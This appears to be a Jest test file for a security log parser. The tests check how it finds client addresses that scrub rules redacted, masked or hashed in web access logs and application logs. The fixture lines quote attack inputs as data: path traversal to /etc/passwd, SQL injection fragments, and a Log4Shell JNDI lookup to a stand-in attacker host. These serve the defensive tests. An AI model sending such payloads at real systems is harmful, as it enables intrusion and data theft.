import { describe, expect, test } from "@jest/globals";
import crypto from "crypto";
import ScrubHashToken from "../../../../Server/Utils/Telemetry/ScrubHashToken";
import {
  IPV4_ADDRESS_MASK as SCRUB_IPV4_MASK,
  IPV6_ADDRESS_MASK as SCRUB_IPV6_MASK,
} from "../../../../Utils/Telemetry/ScrubIpAddress";
import { JSONObject } from "../../../../Types/JSON";
import NormalizedSecurityEvent from "../../../../Types/SecurityEvent/NormalizedSecurityEvent";
import { SECURITY_REQUEST_ATTRIBUTES } from "../../../../Types/SecurityEvent/SecurityEventRequestOutcome";
import SecurityLogParser from "../../../../Utils/SecurityEvent/LogParsers/SecurityLogParser";
import WebAttackLogParser, {
  AccessLogRequest,
  ClientAddressReadingOfText,
  readClientAddress,
  readClientAddressReading,
  readCommonLogFormat,
  readJsonAccessLog,
  readRequestFromAttributes,
} from "../../../../Utils/SecurityEvent/LogParsers/WebAttackLogParser";
import {
  CLIENT_ADDRESS_SCRUB_MARKER_ATTRIBUTES,
  HiddenClientAddress,
  ScrubbedAddressKind,
  ScrubbedAddressPlace,
  readHiddenClientAddress,
} from "../../../../Utils/SecurityEvent/ScrubbedAddress";
import { FastestRun, fastestRun } from "../../../Helpers/FastestRun";
import { logLine } from "./LogParserFixtures";

/*
 * A web access log line whose client address a log scrub rule hid
 * (#10397). "Your logs" reads the stored line, after the rule ran, so the
 * line's first word, its JSON client field, its attributes or the address
 * after "client:" is what the rule left. The event names no address and
 * says a scrub rule hid it, what it left and where - the line, or its
 * attributes - so the rule can be found.
 *
 * And the line's client is its client field: once a rule hid it, no other
 * address the line holds - a query parameter the sender wrote - takes its
 * place.
 */

const LEGACY_TOKEN: string = `[HASHED:${crypto.createHash("sha256").update("203.0.113.7").digest("hex").substring(0, 8)}]`;
// The token a Hash rule makes now (#10394), by the engines' own function.
const KEYED_TOKEN: string = ScrubHashToken.ofIpAddress({
  projectId: "0192f1a0-0000-7000-8000-00000000a0a1",
  address: "203.0.113.7",
});

// What each action leaves of 203.0.113.7, and of 2001:db8::7 when a rule hides IPv6 (#10393).
const SCRUBBED: ReadonlyArray<[string, ScrubbedAddressKind]> = [
  ["[REDACTED]", ScrubbedAddressKind.Redacted],
  [SCRUB_IPV4_MASK, ScrubbedAddressKind.Masked],
  [SCRUB_IPV6_MASK, ScrubbedAddressKind.Masked],
  [LEGACY_TOKEN, ScrubbedAddressKind.Hashed],
  [KEYED_TOKEN, ScrubbedAddressKind.Hashed],
];

function accessLogLine(
  client: string,
  target: string = "/static/../../etc/passwd",
): string {
  return `${client} - - [20/Nov/2026:10:00:05 +0000] "GET ${target} HTTP/1.1" 404 153 "-" "curl/8.5.0"`;
}

function parseOne(
  body: string,
  attributes: JSONObject = {},
): NormalizedSecurityEvent {
  const events: Array<NormalizedSecurityEvent> = WebAttackLogParser.parse(
    logLine(body, attributes),
  );

  expect(events).toHaveLength(1);

  return events[0]!;
}

function hiddenOf(event: NormalizedSecurityEvent): {
  principalIp: string;
  hidden: Pick<HiddenClientAddress, "kind" | "value" | "place"> | null;
} {
  const hidden: HiddenClientAddress | null = readHiddenClientAddress(event);

  return {
    principalIp: event.principalIp,
    hidden: hidden
      ? { kind: hidden.kind, value: hidden.value, place: hidden.place }
      : null,
  };
}

describe("an access log line whose client a scrub rule hid", () => {
  test("is an attack from an address a scrub rule hid in the line, whatever the rule left", () => {
    for (const [scrubbed, kind] of SCRUBBED) {
      expect({
        scrubbed,
        ...hiddenOf(parseOne(accessLogLine(scrubbed))),
      }).toEqual({
        scrubbed,
        principalIp: "",
        hidden: { kind, value: scrubbed, place: ScrubbedAddressPlace.LogBody },
      });
    }
  });

  test("its first word may be the IPv4 address an IPv6 socket wrote, with only the dotted quad hidden", () => {
    expect(hiddenOf(parseOne(accessLogLine("::ffff:[REDACTED]")))).toEqual({
      principalIp: "",
      hidden: {
        kind: ScrubbedAddressKind.Redacted,
        value: "[REDACTED]",
        place: ScrubbedAddressPlace.LogBody,
      },
    });
  });

  test("behind a syslog prefix, the word before its identity is the hidden client", () => {
    const request: AccessLogRequest | null = readCommonLogFormat(
      'Nov 20 10:00:00 lb-1 nginx: [REDACTED] - - [20/Nov/2026:10:00:00 +0000] "POST /login HTTP/2.0" 401 0 "-" "hydra"',
    );

    expect(request).toEqual({
      clientIp: "",
      scrubbedClient: {
        kind: ScrubbedAddressKind.Redacted,
        value: "[REDACTED]",
      },
      method: "POST",
      target: "/login",
      status: 401,
      userAgent: "hydra",
    });
  });

  test("a JSON access log's client field holds what the rule left", () => {
    for (const [scrubbed, kind] of SCRUBBED) {
      const body: string = JSON.stringify({
        remote_addr: scrubbed,
        request: "GET /search?q=1 union select password from users HTTP/1.1",
        status: "200",
      });

      expect(readJsonAccessLog(body)?.scrubbedClient).toEqual({
        kind,
        value: scrubbed,
      });
      expect({ scrubbed, ...hiddenOf(parseOne(body)) }).toEqual({
        scrubbed,
        principalIp: "",
        hidden: { kind, value: scrubbed, place: ScrubbedAddressPlace.LogBody },
      });
    }
  });

  test("an address the line's attributes verify is the client's: nothing is hidden then", () => {
    const event: NormalizedSecurityEvent = parseOne(
      accessLogLine("[REDACTED]"),
      {
        "network.peer.address": "203.0.113.7",
      },
    );

    expect(hiddenOf(event)).toEqual({
      principalIp: "203.0.113.7",
      hidden: null,
    });
  });

  test("a client.address the line's attributes only claim leaves the hidden client hidden, and is kept as a claim (#10416)", () => {
    const event: NormalizedSecurityEvent = parseOne(
      accessLogLine("[REDACTED]"),
      {
        "client.address": "203.0.113.7",
      },
    );

    expect(hiddenOf(event)).toEqual({
      principalIp: "",
      hidden: {
        kind: ScrubbedAddressKind.Redacted,
        value: "[REDACTED]",
        place: ScrubbedAddressPlace.LogBody,
      },
    });
    expect(event.attributes).toEqual(
      expect.objectContaining({
        "oneuptime.request.client_address_trust": "peer",
        "oneuptime.request.claimed_client_address": "203.0.113.7",
        "oneuptime.request.claimed_client_address_from": "client.address",
      }),
    );
  });

  test("no other address of the line takes the hidden client's place", () => {
    // The sender wrote these: a query parameter, a referrer.
    for (const target of [
      "/login?next=/../../etc/passwd&from=198.51.100.9",
      "/download?file=../../etc/passwd&ip=198.51.100.9",
      "/x?src=198.51.100.9&q=union select",
    ]) {
      const event: NormalizedSecurityEvent = parseOne(
        accessLogLine("[REDACTED]", target),
      );

      expect({ target, ...hiddenOf(event) }).toEqual({
        target,
        principalIp: "",
        hidden: {
          kind: ScrubbedAddressKind.Redacted,
          value: "[REDACTED]",
          place: ScrubbedAddressPlace.LogBody,
        },
      });
    }
  });
});

describe("an access log line's client is never what its request says", () => {
  test("a line whose client field holds no address takes none from its request, its referrer or its user agent", () => {
    for (const line of [
      // Apache with HostnameLookups On: the client's name, not its address.
      'crawler-66-249-66-1.example.net - - [20/Nov/2026:10:00:05 +0000] "GET /login?from=198.51.100.9&next=../../etc/passwd HTTP/1.1" 404 153 "-" "curl/8.5.0"',
      '- - - [20/Nov/2026:10:00:05 +0000] "GET /x?ip=198.51.100.9&q=../../etc/passwd HTTP/1.1" 404 153 "-" "curl/8.5.0"',
      'proxy - - [20/Nov/2026:10:00:05 +0000] "GET /x?q=../../etc/passwd HTTP/1.1" 404 153 "http://example.com/?client=198.51.100.9" "curl/8.5.0"',
      'proxy - - [20/Nov/2026:10:00:05 +0000] "GET /x?q=../../etc/passwd HTTP/1.1" 404 153 "-" "scanner from 198.51.100.9"',
    ]) {
      expect({ line, principalIp: parseOne(line).principalIp }).toEqual({
        line,
        principalIp: "",
      });
    }
  });

  test("a label before its request line is still the client's", () => {
    expect(
      parseOne(
        'client=203.0.113.7 "GET /x?q=../../etc/passwd HTTP/1.1" 404 153 "-" "curl/8.5.0"',
      ).principalIp,
    ).toBe("203.0.113.7");
  });

  test("an address in its client field is read as it always was", () => {
    expect(parseOne(accessLogLine("203.0.113.41")).principalIp).toBe(
      "203.0.113.41",
    );
    expect(
      parseOne(accessLogLine("203.0.113.41", "/x?from=198.51.100.9&q=../../"))
        .principalIp,
    ).toBe("203.0.113.41");
  });
});

describe("an application's log line whose client a scrub rule hid", () => {
  test("its attributes' connection address holds what the rule left", () => {
    for (const key of [
      "net.peer.ip",
      "network.peer.address",
      "net.sock.peer.addr",
      "source.address",
    ]) {
      expect(
        readRequestFromAttributes({ [key]: KEYED_TOKEN }).scrubbedClient,
      ).toEqual({ kind: ScrubbedAddressKind.Hashed, value: KEYED_TOKEN });

      const event: NormalizedSecurityEvent = parseOne(
        "WARN rejected header X-Api-Version=${jndi:ldap://attacker.example/x} on /api/v1/orders",
        { [key]: KEYED_TOKEN, "url.path": "/api/v1/orders" },
      );

      expect({ key, ...hiddenOf(event) }).toEqual({
        key,
        principalIp: "",
        hidden: {
          kind: ScrubbedAddressKind.Hashed,
          value: KEYED_TOKEN,
          place: ScrubbedAddressPlace.LogAttributes,
        },
      });
    }
  });

  test("its attributes' client.address, which a request can claim, is a hidden claim, never the hidden client (#10416)", () => {
    for (const key of ["client.address", "http.client_ip"]) {
      expect(
        readRequestFromAttributes({ [key]: KEYED_TOKEN }).scrubbedClient,
      ).toBeUndefined();

      const event: NormalizedSecurityEvent = parseOne(
        "WARN rejected header X-Api-Version=${jndi:ldap://attacker.example/x} on /api/v1/orders",
        { [key]: KEYED_TOKEN, "url.path": "/api/v1/orders" },
      );

      expect({ key, ...hiddenOf(event) }).toEqual({
        key,
        principalIp: "",
        hidden: null,
      });
      expect(event.attributes).toEqual(
        expect.objectContaining({
          "oneuptime.request.client_address_trust": "claimed",
          "oneuptime.request.claimed_client_address": KEYED_TOKEN,
          "oneuptime.request.claimed_client_address_from": key,
        }),
      );
    }
  });

  test("its words name an address a rule hid after a word that names one", () => {
    const cases: ReadonlyArray<[string, string]> = [
      ["WARN rejected ../../etc/passwd from [REDACTED].", "[REDACTED]"],
      ["WARN rejected ../../etc/passwd From: [REDACTED]", "[REDACTED]"],
      [
        '2026/11/20 10:00:14 [error] 88#88: *1 open() "/usr/share/nginx/html/../../etc/passwd" failed (2: No such file or directory), client: [REDACTED], server: localhost',
        "[REDACTED]",
      ],
      // Apache's error log: the bracket after the port is the line's.
      [
        "[Fri Nov 20 10:00:14.575 2026] [core:error] [pid 88] [client [REDACTED]:51234] AH00126: Invalid URI in request GET /..%2f..%2fetc/passwd HTTP/1.1",
        "[REDACTED]",
      ],
      [
        `level=warn remote_addr=${SCRUB_IPV4_MASK} msg="' or 1=1"`,
        SCRUB_IPV4_MASK,
      ],
      [`level=warn src=${LEGACY_TOKEN} msg=../../etc/passwd`, LEGACY_TOKEN],
      [`WARN union select (from [::ffff:[REDACTED]]:44220)`, "[REDACTED]"],
      [`WARN union select from [${SCRUB_IPV6_MASK}]:443`, SCRUB_IPV6_MASK],
    ];

    for (const [line, scrubbed] of cases) {
      const event: NormalizedSecurityEvent = parseOne(line);

      expect({ line, ...hiddenOf(event) }).toEqual({
        line,
        principalIp: "",
        hidden: expect.objectContaining({
          value: scrubbed,
          place: ScrubbedAddressPlace.LogBody,
        }),
      });
    }
  });

  test("an address its words name wins over one its attributes hid", () => {
    const event: NormalizedSecurityEvent = parseOne(
      "WARN rejected ../../etc/passwd from 203.0.113.16",
      { "client.address": "[REDACTED]" },
    );

    expect(hiddenOf(event)).toEqual({
      principalIp: "203.0.113.16",
      hidden: null,
    });
  });

  test("its attributes' hidden address is said before its words'", () => {
    const event: NormalizedSecurityEvent = parseOne(
      "WARN rejected ../../etc/passwd from [REDACTED]",
      { "network.peer.address": LEGACY_TOKEN },
    );

    expect(hiddenOf(event).hidden).toEqual({
      kind: ScrubbedAddressKind.Hashed,
      value: LEGACY_TOKEN,
      place: ScrubbedAddressPlace.LogAttributes,
    });
  });

  test("its words' hidden address is said before a hidden address its attributes only claim", () => {
    const event: NormalizedSecurityEvent = parseOne(
      "WARN rejected ../../etc/passwd from [REDACTED]",
      { "client.address": LEGACY_TOKEN },
    );

    expect(hiddenOf(event).hidden).toEqual({
      kind: ScrubbedAddressKind.Redacted,
      value: "[REDACTED]",
      place: ScrubbedAddressPlace.LogBody,
    });
    expect(event.attributes["oneuptime.request.claimed_client_address"]).toBe(
      LEGACY_TOKEN,
    );
  });
});

describe("a line whose client no rule hid", () => {
  test("names no hidden address: no address, a name, or another redactor's word", () => {
    for (const line of [
      "WARN rejected ../../etc/passwd",
      "WARN rejected ../../etc/passwd from host.example",
      "WARN rejected ../../etc/passwd from [Redacted]",
      "WARN user [REDACTED] tried ../../etc/passwd",
      accessLogLine("app.internal"),
    ]) {
      const event: NormalizedSecurityEvent = parseOne(line);

      expect({ line, ...hiddenOf(event) }).toEqual({
        line,
        principalIp: "",
        hidden: null,
      });
    }
  });

  test("an address names itself, as it always did", () => {
    const event: NormalizedSecurityEvent = parseOne(
      accessLogLine("203.0.113.41"),
    );

    expect(hiddenOf(event)).toEqual({
      principalIp: "203.0.113.41",
      hidden: null,
    });
    expect(
      Object.keys(event.attributes).filter((key: string): boolean => {
        return CLIENT_ADDRESS_SCRUB_MARKER_ATTRIBUTES.includes(key);
      }),
    ).toEqual([]);
    // The access log's client field is the connection's own address.
    expect(event.attributes["oneuptime.request.client_address_trust"]).toBe(
      "peer",
    );
  });
});

describe("what the log scan makes of a line", () => {
  test("reads a web access log line's hidden client as the web attack parser does", () => {
    const events: Array<NormalizedSecurityEvent> = SecurityLogParser.parse(
      logLine(accessLogLine(KEYED_TOKEN)),
    );

    expect(events).toHaveLength(1);
    expect(events[0]!.principalIp).toBe("");
    expect(events[0]!.observables).not.toContain(KEYED_TOKEN);
    expect(
      events[0]!.attributes[SECURITY_REQUEST_ATTRIBUTES.clientAddressScrubbed],
    ).toBe(KEYED_TOKEN);
    expect(readHiddenClientAddress(events[0]!)?.signal).toBe("log");
  });
});

describe("the client of a line in no known format, as read", () => {
  test("an address anywhere wins over what a rule left in a more telling place", () => {
    const reading: ClientAddressReadingOfText = readClientAddressReading(
      "[REDACTED] rejected union select from 203.0.113.25",
    );

    expect(reading).toEqual({ address: "203.0.113.25", scrubbed: null });
    expect(readClientAddress("[REDACTED] rejected union select")).toBe("");
  });

  test("the first word is said first, then the labels in their order", () => {
    expect(
      readClientAddressReading(`${LEGACY_TOKEN} union select from [REDACTED]`)
        .scrubbed,
    ).toEqual({ kind: ScrubbedAddressKind.Hashed, value: LEGACY_TOKEN });
    expect(
      readClientAddressReading(
        `WARN from ${SCRUB_IPV4_MASK} client: [REDACTED] union select`,
      ).scrubbed,
    ).toEqual({ kind: ScrubbedAddressKind.Redacted, value: "[REDACTED]" });
  });

  test("400,000 characters of labels before what a rule leaves take time in line with them", () => {
    const texts: ReadonlyArray<string> = [
      "from [REDACTED".repeat(28000),
      "client: [HASHED:".repeat(25000),
      `from ${"[".repeat(400000)}`,
      `ip=${"*".repeat(400000)}`,
      "from ***.***.***.*** x ".repeat(18000),
      `client: ${"]".repeat(400000)}`,
    ];

    const run: FastestRun<number> = fastestRun({
      run: (): number => {
        let hidden: number = 0;

        for (const text of texts) {
          hidden += readClientAddressReading(text).scrubbed ? 1 : 0;
        }

        return hidden;
      },
      limitInMs: 2000,
    });

    expect(run.inMs).toBeLessThan(2000);
    // Only the masks are what a rule leaves.
    expect(run.result).toBe(1);
  });
});
